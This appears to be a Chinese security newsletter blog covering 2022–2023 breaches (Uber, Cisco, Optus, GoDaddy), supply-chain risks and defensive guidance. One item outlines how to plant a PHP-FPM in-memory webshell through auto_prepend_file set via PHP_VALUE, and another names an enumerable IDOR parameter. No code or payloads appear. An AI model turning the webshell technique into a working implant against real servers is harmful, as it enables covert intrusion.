https://www.enisa.europa.eu/topics/cyber-exercises/cyber-europe-programme/cyber-europe-2022\r\n\r\n## 供应链安全\r\n### 针对工业系统的恶意密码破解软件\r\n\r\n恶意攻击者正在使用含有木马程序的可编程序控制器密码破解工具来感染工业系统。来自 Dragos 的研究人员分析了一个恶意密码破解工具，其中包含恶意软件 Sality，它将被感染的系统集中成僵尸网络的一部分。\r\n\r\n#### 一些感悟\r\n> 从未经审查的来源下载软件并运行可能很危险，谁知道有没有鬼在里面呢？比如：网上的各种破解软件……\r\n\r\n#### 参考资料\r\n- https://www.dragos.com/blog/the-trojan-horse-malware-password-cracking-ecosystem-targeting-industrial-operators/\r\n\r\n### 欺骗的 GitHub 提交元数据为软件供应链攻击创造了可能\r\n\r\n来自 Checkmarx 的研究人员表示，伪造的元数据可能被用来欺骗开发人员使用包含恶意代码的存储库。开发人员需要对验证与提交相关的身份保持警惕。\r\n\r\nGit 版本控制系统的核心功能之一是提交。\r\n\r\n正如[这里](https://docs.github.com/en/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/about-commits)所指出的，除了数据本身(即对代码的更改)之外，提交还包括元数据。这个元数据以时间戳和创建者身份的形式出现。问题是两者都可以伪造：\r\n\r\n1. **伪造提交时间**\r\n\r\n    **利用场景**\r\n\r\n    由于缺乏对时间戳的验证，恶意用户可以通过使其看起来已经非常活跃很长时间来显得可信。\r\n\r\n    GitHub 上用户活动的一个重要衡量标准是在用户个人资料页面上显示的“活动图”。这个图本质上是一个显示用户活动时间的热图。因此，如果我们能够使用我们想要的任何时间戳来制造提交，我们就可以用伪造的活动来填充这个图。\r\n\r\n2. **伪造贡献者**\r\n\r\n    **利用场景**\r\n\r\n    正如几周前 Aqua 所显示的，NPM 包管理器允许包所有者在他们的包中添加任何他们想要的贡献者，并通过这样做来提高他们的项目声誉和可信度。\r\n\r\n    通过欺骗提交者的身份，GitHub 存储库也可以做到这一点。为了使他们的项目看起来可靠，攻击者可以使用这种技术一次或多次，并用已知的可靠贡献者填充存储库的贡献者部分，这反过来又使项目看起来可靠。\r\n\r\n#### 一些感悟\r\n> GitHub 提供了一个安全特性来解决这个问题，允许开发人员在提交代码时验证他们的身份，但这更依赖于开发人员的安全意识和积极参与。\r\n\r\n#### 参考资料\r\n- https://checkmarx.com/blog/unverified-commits-are-you-unknowingly-trusting-attackers-code/\r\n\r\n## 友商动态\r\n### 微软关闭了两种攻击途径: Office 宏和 RDP 暴力破解\r\n\r\n这家企业 IT 巨头的政策是在下载的 Office 文档中默认屏蔽 Visual Basic for Applications (VBA)宏，但在短暂停顿之后，该政策再次被激活，以回应那些在安全防御方面遇到困难的用户的反馈。\r\n\r\n同样在本周，微软在 Windows 11中启用了一个默认设置，该设置旨在阻止或减缓明显的远程桌面协议(Remote Desktop Protocol，RDP)暴力破解攻击；在10次不正确的登录尝试后，帐户将被锁定10分钟。在 Windows10中可以使用帐户锁定设置，但默认情况下不启用该设置。\r\n\r\n#### 参考资料\r\n- https://www.theregister.com/2022/07/22/microsoft-windows-vba-macros/\r\n\r\n"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202208/","title":"Security.News@202208"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202208\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 行业动态\r\n  - TTPs动态\r\n  - 安全事件\r\n  - Twillo\r\n  - Cisco\r\n  - Lapsus$\r\n  - 勒索软件\r\n  - 奇安信\r\n  - Cloudflare\r\n  - 钓鱼\r\n  - MFA\r\n  - 隐私\r\n---\r\n\r\n## 行业动态\r\n### CNCERT发布《**勒索软件防范指南**》\r\n\r\n感概CNCERT终于不土了，做出来这么互联网范儿的指南\r\n\r\n![勒索软件防范指南](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/o6MFMh.jpg)\r\n\r\n#### 参考资料\r\n- http://www.cac.gov.cn/2021-08/30/c_1631913461840082.htm\r\n\r\n### 新工具检查移动应用的浏览器是否存在隐私风险，Instagram/facebook等app中招\r\n\r\n8月19日报道，一个名为“InAppBrowser”的新在线工具可让您分析嵌入在移动应用程序中的应用内浏览器的行为，并确定它们是否将威胁隐私的JavaScript注入您访问的网站。\r\n\r\n该工具由开发人员Felix Krause创建，他在本月早些时候警告过这种潜在的风险行为，并解释了应用内浏览器通过在用户访问的每个网页上注入JavaScript跟踪器来跟踪用户在线看到和做的任何事情是多么容易。\r\n\r\n![相关twitter](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/8bHtpb.jpg)\r\n\r\n以Instagram为例，可以看到插入的js做了哪些事情：\r\n\r\n![aOe2oK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/aOe2oK.jpg)\r\n\r\n## TTPs动态\r\n### 微软观察到现在越来越多的threat actor（国家级）开始使用Sliver，弃用cs\r\n\r\n微软分了Sliver的一些原理和功能模版，以及应对的检测方案；Sliver确实比CS更加灵活好用，两者的对比可以参考下面的文章\r\n- https://voiptuts.com/sliver-emerges-as-cobalt-strike-different-for-malicious-c2/\r\n- https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/\r\n\r\n### 利用 PHP-FPM 做内存马的方法\r\n\r\n属于旧壶装旧酒，最近看到很多人在讨论，就在这里也列一下\r\n\r\n核心原理是：\r\n\r\n1. php-fpm可通过某种方式（绑定外网、SSRF）直接访问\r\n2. Web 服务器中间件会将用户请求设置成环境变量（Fastcgi→php-fpm）,强大的 PHP 中有两个有趣的配置项：\r\n    1. `auto_prepend_file`：告诉PHP，在执行目标文件之前，先包含 `auto_prepend_file` 中指定的文件。\r\n    2. `auto_append_file`：告诉PHP，在执行完成目标文件后，再包含 `auto_append_file` 指向的文件。\r\n3. 在一次 fastcgi 请求中，任何通过 PHP_VALUE/PHP_ADMIN_VALUE 修改过的PHP配置值，在此 FPM 进程的生命周期内，都是会保留下来的。\r\n\r\n#### 参考资料\r\n- https://mp.weixin.qq.com/s/VrtFWM3Iufk0xkK_MRCCKA\r\n- https://xz.aliyun.com/t/9544\r\n\r\n## 安全事件\r\n\r\n### Cisco 被Lapsus$入侵\r\n\r\nCisco在2022年8月3日承认，该公司在2022年5月24日遭到入侵，并由思科安全事件应急响应小组（CSIRT）与旗下资安公司Cisco Talos携手补救，起因是一名员工的个人Google帐号遭到骇客入侵。虽然思科并未发现系统被部署勒索木马，但勒索软体集团Yanluowang宣称已取得2.8GB的思科资料。\r\n\r\n用户通过Google Chrome启用了密码同步，并将其Cisco凭据存储在浏览器中，使该信息能够同步到其Google帐户。在获取用户的凭据后，攻击者试图使用各种技术绕过多因素身份验证（MFA），包括语音网络钓鱼（也称为“vishing”）和MFA疲劳，即向目标的移动设备发送大量推送请求的过程，直到用户意外或只是试图使他们正在接收的重复推送通知静音。网络钓鱼是一种越来越常见的社交工程技术，攻击者试图诱骗员工通过电话泄露敏感信息。在这种情况下，一名员工报告说，他们在几天内接到了多个电话，其中呼叫者 - 他们用各种国际口音和方言的英语交谈 - 据称与用户信任的支持组织相关联。\r\n\r\n#### 参考资料\r\n- https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html\r\n\r\n### Twilio 钓鱼入侵事件\r\n\r\n云端通讯平台Twilio在8月7日坦承遭到黑客入侵，黑客通过钓鱼短信取得了Twilio员工的登陆凭证，并窃取了客户数据，而采用Twilio服务进行电话号码认证的Signal则表示，约有1900名用户受到Twilio黑客事件的波及。\r\n\r\n![网传的钓鱼短信](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/6I57MD.jpg)\r\n\r\n#### 参考资料\r\n- https://support.signal.org/hc/en-us/articles/4850133017242-Twilio-Incident-What-Signal-Users-Need-to-Know-\r\n\r\n### 奇安信被黑帽SEO\r\n![nRdJRR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/nRdJRR.jpg)\r\n\r\n官网已经火速加了一个pid参数来代替原来可控的product_name\r\nhttps://www.qianxin.com/support/productDetails?pid=423&product_name=aaa\r\n\r\n### LastPass入侵事件\r\n\r\n据 LastPass 方面表示，黑客透过盗取一个开发者帐户，取得了 LastPass 开发环境的部分权限，有部分源代码和一些专有技术资料因此遭到泄漏，不过客户的资料包括密码则未受影响。\r\n\r\n很值得学习的一点如下，设计之初在架构上就考虑了隐私&安全\r\n\r\n#### 一些感悟\r\n> 我们从不存储或了解您的主密码。我们利用行业标准的零知识架构， 确保 LastPass 永远无法知道或访问我们客户的主密码.您可以在此处阅读有关零知识的技术实现[的信息](https://www.lastpass.com/security/zero-knowledge-security)\r\n\r\n#### 参考资料\r\n- https://blog.lastpass.com/2022/08/notice-of-recent-security-incident/\r\n\r\n### Cloudflare遭遇批量短信钓鱼攻击及他们的应对方案\r\n\r\n昨天，2022年8月8日，Twilio分享说，他们[受到了有针对性的网络钓鱼攻击的破坏](https://www.twilio.com/blog/august-2022-social-engineering-attack)。大约在Twirio受到攻击的同时，Cloudflare看到一个具有非常相似特征的攻击也针对Cloudflare的员工。虽然个别员工确实因网络钓鱼消息而堕落，但我们能够通过自己使用[Cloudflare One产品](https://www.cloudflare.com/cloudflare-one/)以及向访问我们所有应用程序所需的每位员工发放物理安全密钥来阻止攻击。\r\n\r\nCloudflare使用硬件密钥作为MFA，所以即使有3人被钓鱼也没受影响；Google 2018年就使用这种方案了\r\n\r\n#### 参考资料\r\n- https://krebsonsecurity.com/2018/07/google-security-keys-neutralized-employee-phishing/\r\n- https://blog.cloudflare.com/2022-07-sms-phishing-attacks/\r\n"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202209/","title":"Security.News@202209"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202209\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 安全事件\r\n  - 行业动态\r\n  - TTPs动态\r\n  - 友商动态\r\n  - Bug Bounty\r\n  - REvil\r\n  - Uber\r\n  - 绕过MFA\r\n  - Lapsus$\r\n---\r\n\r\n## 安全事件\r\n### REvil 宣布对 Midea美的集团勒索攻击事件负责，并在暗网公开了被盗的数据\r\n8月11日，全网都在疯传Midea美的集团被勒索攻击的事件；就在事件发生20天后，9月1日，REvil 勒索软件组织正式公布，对美的集团的勒索攻击事件负责，并在暗网公开了美的集团被盗的数据。这表明美的集团与REvil谈判破裂，并未支付1000万美元勒索赎金。\r\n\r\n![MkMY9o](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/MkMY9o.jpg)\r\n\r\n#### 一些感悟\r\n> 整个事件发生的原因、过程、影响面都还未披露。在勒索团队肆虐的时代，我们应该做些什么？我们还能幸存多久？\r\n\r\n### Uber被黑客入侵至内部网络\r\n\r\n2022年9月16日，网传uber被黑客入侵，并爆出了更多细节，攻击者还获得了对Uber云服务的管理访问权限，包括在亚马逊网络服务（AWS）和谷歌云（GCP）上，Uber在其中存储其源代码和客户数据，以及该公司的HackerOne漏洞赏金计划。\r\n\r\n有趣的是，攻击者是一名18岁的年轻人，也和Lapsus$一样，有人戏称到：APT=Advanced Persistent Teenagers。\r\n\r\n官方申明如下：\r\n\r\n![Uber官方申明](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cMuDaZ.png)\r\n\r\n#### 攻击路径分析\r\n\r\n![GcunMN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/GcunMN.jpg)\r\n\r\n1. 攻击者通过在黑市购买的凭据信息（基于Racoon恶意软件）获得了Uber员工的凭据，这点和当初Lapsus$入侵微软是一样的。\r\n\r\n![epLMva](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/epLMva.jpg)\r\n2. 攻击者进入内网后，发现内网存在一个网络共享文件（powershell），包含Thycotic（PAM系统）的管理员账号密码，而从Thycotic中，可以找到DA, DUO, Onelogin, AWS, GSuite之类系统的凭据。\r\n\r\n![gbZ0JV](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/gbZ0JV.jpg)\r\n3. 攻击者通过冒充Uber IT工作人员，并不停骚扰那名员工，最终使得员工点击通过了2FA认证，从而绕过2FA。\r\n\r\n![6sn9BQ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/6sn9BQ.jpg)\r\n\r\n#### Uber回应（09/27）\r\n\r\n1. 敏感数据未泄漏\r\n2. 服务正常运转\r\n3. 正在调查中\r\n\r\n![Uber回应](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Uq4aQF.jpg)\r\n\r\n#### 附：相关截图\r\n\r\n![SlN5N9](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SlN5N9.jpg)\r\n![RK8OrT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/RK8OrT.jpg)\r\n![qIZVJ8](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qIZVJ8.jpg)\r\n![NrsSWm](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/NrsSWm.jpg)\r\n![hLWMGn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/hLWMGn.jpg)\r\n\r\n#### 一些感悟\r\n> 通过钓鱼拿到合法凭据突破网络边界的攻击手法越来越普遍和成熟，传统的2FA策略仍无法有效阻止攻击，“人”还是最容易突破的脆弱点。\r\n> \r\n> Twitter、Cloudflare、Google等越来越多的公司开始使用YubiKey这种硬件密钥的方式作为MFA来避免钓鱼攻击，但这种方式成本较高，普及还是有一定难度；还是要从人、流程、技术这三个方面来加固并持续改进，尽可能避免被钓鱼攻击利用成果。\r\n\r\n#### 参考资料\r\n- https://blog.cloudflare.com/2022-07-sms-phishing-attacks/\r\n- https://blog.twitter.com/engineering/en_us/topics/insights/2021/how-we-rolled-out-security-keys-at-twitter\r\n- https://krebsonsecurity.com/2018/07/google-security-keys-neutralized-employee-phishing/\r\n\r\n### Optus遭泄露1120W+用户个人敏感数据\r\n\r\n澳大利亚第二大电信公司Optus宣布它遭受了一次重大数据泄露，该事件涉及1120W+客户的敏感信息。\r\n\r\n![IUPaux](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/IUPaux.png)\r\n\r\n#### 发生了什么？\r\n\r\n![JUKB5e](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JUKB5e.jpg)\r\n\r\n#### 攻击路径分析\r\n\r\n1. 信息表明，数据是在 [http://api.www.optus.com.au](http://api.www.optus.com.au/) 时通过未经身份验证的 REST API 接口泄露的\r\n2. 参数`contactid=XXXXXXXXX`存在IDOR漏洞，导致可被遍历拉取敏感数据，且该参数是一个可预测的数字序列\r\n\r\n#### 一些感悟\r\n> 如此简单、低级的问题依然存在……\r\n>\r\n> 评价安全工作的好坏不要有没有解决高大上的问题，而是能把某一个场景做精做细做好，解决实际问题；很多公司其实连基础工作都没有做好，这里想引用赵武在[网络安全行业的机会：固化最佳实践](https://mp.weixin.qq.com/s?__biz=MjM5NDQ5NjM5NQ==&mid=2651626352&idx=1&sn=80690a89bea1be4ffe21f35bf5ee431d&chksm=bd7ed1948a0958824e5aa50ac5827c978cf1d8a144c02d1a1918319446fc0e3f8604d71846a6&mpshare=1&scene=1&srcid=0123NNRIkGqmZq8ehsuOBJQr&sharer_sharetime=1674449535175&sharer_shareid=28de93b23e4052396c8ecdf9aafa26d0#rd)里面写到的\r\n>\r\n> 最近我老是拿我们公司的安全部门和产品部门举例，比如安全从业人员都会做资产梳理工作，输入的是企业名称，输出的是互联网暴露面清单；还比如说做IP情报画像（溯源反制），输入的是IP列表，输出的是IP对应的价值情报信息。这是基础的不能再基础的工作内容，我相信这不仅仅是我们公司的工作，而几乎是所以安全行业甲乙方都必须具备的基础技能。一方面它们实在太简单了，没有人没做过也没有人不会，另一方面它们实在太难了，同一个工作不同的人来做，效果天地之别。为什么呢？是因为似乎做了就算有交付，除非你有行之有效的对比方法，否则很有可能一个实习生在几次忐忑交付没人提出反对意见之后，都敢于提出老子天下无敌的口号。\r\n\r\n#### 参考资料\r\n- https://www.optus.com.au/about/media-centre/media-releases/2022/09/optus-notifies-customers-of-cyberattack\r\n\r\n### Fast Comany被黑，导致cms被控\r\n\r\n9月28日，Fast Comany被搞，黑客通过Apple news推送不当言论。\r\n\r\n![75Lv2w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/75Lv2w.jpg)\r\n导致被黑的原因有两个：\r\n\r\n1. 系统使用默认口令\r\n\r\n![ZN7mty](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/ZN7mty.jpg)\r\n2. 系统的凭据在外部已泄漏，和Uber被黑原因差不多\r\n\r\n![d9XTwn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/d9XTwn.jpg)\r\n\r\n#### 参考资料\r\n- https://twitter.com/RachelTobac/status/1574948916855914497\r\n\r\n## 行业动态\r\n\r\n### 网络犯罪情报公司HudsonRock提供网络犯罪数据库查询能力\r\n\r\nHudsonRock的产品 - Cavalier和Bayonet - 由我们不断增强的网络犯罪数据库提供支持，该数据库由数百万台在全球恶意软件传播活动中受到损害的机器组成。\r\n\r\n> 我们的高保真数据直接来自威胁主体(threat actor)，而不是来自数据库泄漏。\r\n\r\n不确定他们数据来源是不是黑市，类似Uber入侵事件中提到的：\r\n\r\n> 1. 攻击者通过在黑市购买的凭据信息（基于Racoon恶意软件）获得了Uber员工的凭据，这点和当初Lapsus$入侵微软是一样的。\r\n\r\n#### 产品截图\r\n\r\n![uiytKZ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uiytKZ.jpg)\r\n\r\n地址：https://www.hudsonrock.com/search?domain=apple.com\r\n\r\n### PolySwarm：一个去中心化的威胁情报市场\r\n\r\nPolySwarm 是第一个由以太坊 (Ethereum) 智能合约和区块链技术实现的去中心化威胁情报市场。\r\n\r\nPolySwarm 定义了一个实时威胁情报生态系统，其中涵盖企业用户（如银行、科技公司等）及个人用户、威胁检测引擎供应商（如赛门铁克、奇虎360、卡巴斯基等）、分布在世界各处的信息安全专家的专家竞相开发能检测最新威胁的“微型威胁检测引擎”，在平台上竞相提供更精确的威胁检测判定，提供威胁情报。想像 Airbnb, PolySwarm 提供了杀毒引擎（出租房主）和需要对文档进行威胁扫描（租客）的媒合平台。\r\n\r\nPolySwarm 的“工作量证明”(Proof of Work) 即是微引擎对威胁检测的准确性: 以NCT 花蜜令牌奖励奖励市场中最能够保护企业和最终用户的威胁检测引擎（即其开发专家）。\r\n\r\n### 美国管理和预算办公室 （OMB） 要求各机构NIST关于软件供应链安全的指南\r\n\r\nNIST为软件供应链制定了最佳实践指南，NIST安全软件开发框架（SSDF），SP 800-218和NIST软件供应链安全指南。\r\n\r\n#### 一些感悟\r\n> 看来供应链安全也是目前美帝最迫切的安全需求之一了。\r\n\r\n#### 参考资料\r\n- https://www.whitehouse.gov/wp-content/uploads/2022/09/M-22-18.pdf\r\n- https://csrc.nist.gov/publications/detail/sp/800-218/final\r\n- https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-161r1.pdf\r\n\r\n## TTPs动态\r\n### 赛门铁克威胁狩猎团队在数百个应用程序中找到的内置 AWS 凭证\r\n\r\n我们确定了 1859 个公开可用的应用程序，包括 Android 和 iOS，它们都包含硬编码的 AWS 凭证。几乎所有都是iOS应用程序（98%），这是我们多年来一直在跟踪的平台之间的趋势和差异，可能与不同的应用程序商店审查实践和政策有关。无论如何，我们检查了在应用程序内发现 AWS 凭证嵌入时所涉及的风险的范围和程度。我们发现以下内容：\r\n\r\n- 超过四分之三 （77%） 的应用程序包含有效的 AWS 访问令牌，允许访问私有 AWS 云服务\r\n- 这些应用程序中有近一半（47%）包含有效的AWS令牌，这些令牌还通过亚马逊简单存储服务（Amazon S3）完全访问了大量（通常是数百万个）私有文件。\r\n\r\n#### 参考资料\r\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/mobile-supply-chain-aws\r\n\r\n### 三分之一的 PyPI 包在下载时触发代码执行\r\n\r\nPython 包索引 （PyPI） 中近三分之一的包在下载后自动执行代码。Checkmarx研究工程师Yehuda Gelb写道：“当安装python软件包时，python的软件包管理器pip会尝试收集和处理该软件包的元数据，例如其版本和正常工作所需的依赖项。这个过程在后台自动发生，通过运行作为包结构一部分的主 [setup.py](http://setup.py/) 脚本。攻击者可能会将恶意代码放入 [setup.py](http://setup.py/) 文件中。\r\n\r\n#### 参考资料\r\n- https://thehackernews.com/2022/09/warning-pypi-feature-executes-code.html\r\n\r\n## Bug Bounty\r\n### GitHub 环境注入漏洞影响两个开源项目\r\n\r\n谷歌和Apache的安全研究人员在开源项目的GitHub环境中发现了持续集成/持续交付（CI / CD）漏洞。可以利用这些漏洞来控制项目的 GitHub 操作 CI/CD 管道，修改源代码、窃取数据以及在组织内横向移动。\r\n\r\n1. “workflow_run”事件是一个独特的 GitHub 操作管道触发器，用于执行特权管道，如果不谨慎使用，可能会导致重大安全问题。\r\n2. 数以千计的存储库使用“workflow_run”触发器。我们发现各种常见的易受攻击的工作流配置代码模式容易受到权限提升攻击，即可能使攻击者能够在 CI/CD 管道内运行高特权代码。\r\n3. 一旦“workflow_run”权限提升漏洞被利用，攻击者就可以使用提升的权限，通过修改存储库资源（例如标签、工件、版本等）来触发供应链攻击。\r\n4. 攻击者可以窃取存储库机密和潜在的一些组织机密，从而允许在组织内横向移动并进一步增加其攻击的影响半径。\r\n\r\n#### 参考资料\r\n- https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0\r\n\r\n## 友商动态\r\n\r\n### 微软将于2022年10月正式弃用Exchange Online基本身份验证\r\n\r\nExchange Online 团队本周表示“今天，我们宣布，自 2022 年 10 月 1 日起，我们将永久关闭所有租户的基本身份验证，无论使用情况如何(SMTP 身份验证除外，此后仍可重新启用)。”\r\n\r\n#### 为什么基本身份验证被禁用?\r\n\r\n虽然微软没有具体说明本周决定发布此公告的具体原因，但据推测原因可能是因为一份来自网络安全公司Guardicore的报告，该报告揭示了数十万个 Windows 域凭证泄露。Guardicore 副总裁 Amit Serper 还披露了一种名为“The ol” switcheroo 的攻击，包括向客户端发送请求以降级到较弱的身份验证方案(即HTTP 基本身份验证)，而不是像 OAuth 或 NTLM 这样的安全方法，提示电子邮件应用程序已明文形式发送域凭据。\r\n\r\n虽然它极大地简化了身份验证过程，但基本身份验证还使攻击者在未使用传输层安全 (TLS) 加密协议保护连接时更容易窃取凭据。更糟糕的是，在使用基本身份验证时启用多因素身份验证 (MFA) 并不容易;因此，通常它根本不被使用。\r\n\r\n现代身份验证(Active Directory 身份验证库 (ADAL) 和基于 OAuth 2.0 令牌的身份验证)允许应用程序使用 OAuth 访问的生命周期是有限的，并且不能重复用于为其提供的资源之外的其他资源进行身份验证。\r\n\r\n开启现代身份验证后，启用和强制执行 MFA 将变得更加简单，直接快速是提高 Exchange Online 中的数据安全性。\r\n\r\n#### 参考资料\r\n- https://techcommunity.microsoft.com/t5/exchange-team-blog/basic-authentication-deprecation-in-exchange-online-september/ba-p/3609437\r\n"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202302/","title":"Security.News@202302"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202302\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 安全事件\r\n  - 安全可视化\r\n  - 安全框架\r\n  - 最佳实践\r\n  - 安全报告\r\n  - NSA\r\n  - MITRE\r\n  - netscout\r\n  - Coinbase\r\n  - Godaddy\r\n  - Lastpass\r\n  - 开源\r\n  - Synopsys\r\n---\r\n\r\n## 安全框架\r\n### MITRE 发布网络弹性工程（Cyber Resiliency Engineering Framework）框架导航器\r\n2021年的RSAC大会的主题是“Resilience”，想讨论的概念是：实现100%的防护不仅不现实，还会导致错误的安全感。必须考虑在防护失效的情况下如何确保系统安全并快速恢复。 \r\n\r\n2011年MITRE就提出了Cyber Resiliency Engineering Framework的概念，整个框架以风险管理为导向，明确网络弹性的目的（goal），并逐层分解为一系列目标（object）、子目标、活动/能力。然后在战略设计原则和落地的结构设计原则的指引下，针对每个活动/能力选取相适应的技巧（technique）及其配套的方法（approch）。最后对每个活动/能力的实现效果按照选定的指标集合进行有效性度量（MOE）和评分。\r\n\r\n其中的指标设计也有点意思，提出了一个基于攻防对抗的可观测对象（功能项和性能项）时序图（如下），图中红色是攻击视角，采用了攻击链模型；蓝色是防守视角，分为了PDRR四个环节，在数据破坏这个场景下，功能和性能会显著下降，而在数据外泄下就没什么变化。\r\n\r\n![AWpoDz](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/AWpoDz.jpg)\r\n\r\n基于时序图，可以帮助我们针对CREF中的每个活动设计出相应的网络弹性指标。\r\n\r\nMITRE也发布了可视化的CREF工具，并与ATT&CK关联起来了，链接见参考资料二。\r\n\r\n#### 参考资料\r\n- https://www.darkreading.com/dr-tech/mitre-releases-tool-to-design-cyber-resilient-systems\r\n- https://crefnavigator.mitre.org/navigator\r\n\r\n## 最佳实践\r\n### NSA 分享有关如何保护您的家庭网络的最佳实践指南\r\n美国国家安全局 (NSA) 已发布指南，以帮助远程工作者保护他们的家庭网络并保护他们的设备免受攻击。\r\n\r\n国防部情报机构周三发布的指南包括一长串建议，其中包括一小段要点，敦促远程工作人员确保他们的设备和软件是最新的。\r\n\r\n还建议远程工作人员定期备份他们的数据以防止数据丢失，并断开他们不使用的设备，如果它们不需要始终保持活跃的互联网连接的话。\r\n\r\n要在您的其中一台设备被感染时删除非持久性恶意软件，您还应该经常重新启动它们或安排重新启动以进一步降低这种风险。\r\n\r\n“至少，你应该安排每周重新启动你的路由设备、智能手机和计算机。定期重新启动有助于移除植入物并确保安全，”美国国家安全局说。\r\n\r\n其他最佳做法包括在您的计算机上使用非特权用户帐户，尽可能启用自动更新，以及在不使用网络摄像头和麦克风时禁用它们以阻止通过受损设备或恶意软件进行的窃听企图。\r\n\r\n![cXrd4s](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/cXrd4s.jpg)\r\n#### 参考资料\r\n- https://media.defense.gov/2023/Feb/22/2003165170/-1/-1/0/CSI_BEST_PRACTICES_FOR_SECURING_YOUR_HOME_NETWORK.PDF\r\n\r\n## 安全可视化\r\n### netscout的DDoS攻击向量可视化挺有意思\r\n使用类似元素周期表的形式来做可视化，看起来还是比较清晰和舒服的，不过在中文环境可能有些水土不服，见：\r\n![3TLCtg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/3TLCtg.jpg)\r\n\r\n微软的威胁报告中也曾使用过类似的形式：\r\n![Zyznvr](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/Zyznvr.jpg)\r\n\r\n#### 参考资料\r\n- https://www.netscout.com/threatreport/ddos-attack-vectors/\r\n- https://twitter.com/fr0gger_/status/1627203918412537857\r\n\r\n\r\n## 安全事件\r\n### GoDaddy 披露了存在多年的安全漏洞，导致客户和员工登录凭证泄漏、服务器被安装恶意软件、并有源代码被盗窃\r\n\r\n2023年2月16日，网络托管巨头 GoDaddy 表示其遭受了黑客攻击，在多年的攻击中，cPanel被拿下，导致客户和员工登录凭证泄漏、服务器被安装恶意软件、并有源代码被盗窃；GoDaddy早在2022年12月就被客户告知他们的网站会重定向到随机域名，在调查中发现，攻击者在2019年到2022年中有四次被发现，但一直没有失去访问权限。\r\n\r\n“根据我们的调查，我们认为这些事件是一个复杂的威胁行为者组织多年活动的一部分，该组织除其他外，在我们的系统上安装了恶意软件并获取了与 GoDaddy 内某些服务相关的代码片段，”托管公司在提交给美国证券交易委员会的[文件](https://d18rn0p25nwr6d.cloudfront.net/CIK-0001609711/e4736ddb-b4c7-485b-a8fc-1827691692c9.pdf)中说。\r\n\r\nTwitter上有人爆料说是内鬼导致的：\r\n\r\n![Twitter传闻](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SiNKd9.png)\r\n\r\n![Twitter传闻](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Vobcnx.png)\r\n\r\n而攻击者的目的，可能是**利用Godaddy作为跳板，以进行网络钓鱼活动、恶意软件分发和其他恶意活动。**\r\n\r\n#### 附：Godaddy安全事件时间线\r\n\r\n- 2020年3月，攻击者获得了登录凭据并访问了数量有限的员工账户和属于大约 28000 名客户的托管账户。\r\n- 2020年4月，GoDaddy 的一名员工被黑客控制，导致Escrow.com被入侵。\r\n- 2020年1月，GoDaddy 的员工被黑客诱骗修改了至少两个加密货币网站的 DNS 设置。\r\n- 2021年9月，攻击者获得了 120 万个当前不活跃的托管 WordPress 用户的 WordPress 管理员帐户、电子邮件地址和 FTP 帐户的登录凭据。 GoDaddy 于 2021 年 11 月正式披露了该漏洞。\r\n- 2021年11月，攻击者获得了可以访问 GoDaddy 的托管 WordPress 服务源代码。\r\n- 2022年12月，攻击者获得了 cPanel 托管服务器的权限。\r\n\r\n#### 一些感悟\r\n> 攻击者有一定的反侦查能力，比如：有客户反馈GoDaddy的网站会重定向到随机域名，但Godaddy自己能难复现该问题\r\n> \r\n> 2020年就发现了系统被入侵，直到2023年还未解决（攻击者一直有权限），是APT的手法高级/隐蔽，还是Godaddy的安全能力不足呢？\r\n\r\n#### 参考资料\r\n- https://www.computing.co.uk/news/4074669/godaddy-realised-security-breach\r\n- 